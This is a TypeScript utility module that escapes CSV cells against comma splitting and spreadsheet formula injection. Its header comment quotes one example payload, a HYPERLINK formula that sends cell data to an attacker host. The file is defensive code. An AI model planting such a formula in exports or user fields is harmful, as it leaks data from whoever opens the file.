/**
 * CSV utilities — v2.7.75.
 *
 * Several dashboard pages used to build CSVs by `rows.map((r) => r.join(','))`,
 * which exposed two issues:
 *   1. Cells containing commas / quotes silently split into multiple
 *      columns. A customer named "Smith, John" exported as two columns
 *      named "Smith" and "John".
 *   2. CSV formula injection (CWE-1236). Excel / Sheets / Numbers all
 *      evaluate cells beginning with `=`, `+`, `-`, `@`, or a tab/CR
 *      as formulas. A malicious display name like
 *      `=HYPERLINK("https://attacker.com/x?p=" & A2,"click")` could
 *      exfiltrate data the moment the merchant opened the export.
 *
 * Use `buildCsv(rows)` instead of any hand-rolled join — it escapes
 * each cell via `csvEscapeCell` (which handles both injection and the
 * comma/quote/newline cases).
 */

/**
 * Escape a single cell value for CSV output.
 *  - Stringifies non-string inputs (Date → ISO, number → toString, etc.)
 *  - Strips embedded newlines (any column-spanning newline corrupts the
 *    row layout when the cell isn't quoted)
 *  - Prepends a single quote when the value starts with a formula-trigger
 *    character (`=`, `+`, `-`, `@`, `\t`, `\r`)
 *  - Wraps the result in double quotes when it contains a comma or quote
 */
export function csvEscapeCell(v: unknown): string {
  if (v === null || v === undefined) return '';
  let s =
    typeof v === 'string'
      ? v
      : v instanceof Date
        ? v.toISOString()
        : String(v);
  s = s.replace(/\r?\n/g, ' ').replace(/\r/g, ' ');
  if (s.length > 0 && /^[=+\-@\t\r]/.test(s)) {
    s = "'" + s;
  }
  if (s.includes(',') || s.includes('"')) {
    s = '"' + s.replace(/"/g, '""') + '"';
  }
  return s;
}

/** Build a CSV string from an array of rows. Each row is an array of
 *  cell values; mixed types are coerced via csvEscapeCell. */
export function buildCsv(rows: ReadonlyArray<ReadonlyArray<unknown>>): string {
  return rows.map((row) => row.map(csvEscapeCell).join(',')).join('\n');
}

/** Trigger a download of a CSV file in the browser. Lowest-friction
 *  helper — pages that already had Blob+URL plumbing can keep theirs. */
export function downloadCsv(filename: string, rows: ReadonlyArray<ReadonlyArray<unknown>>): void {
  const csv = buildCsv(rows);
  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}
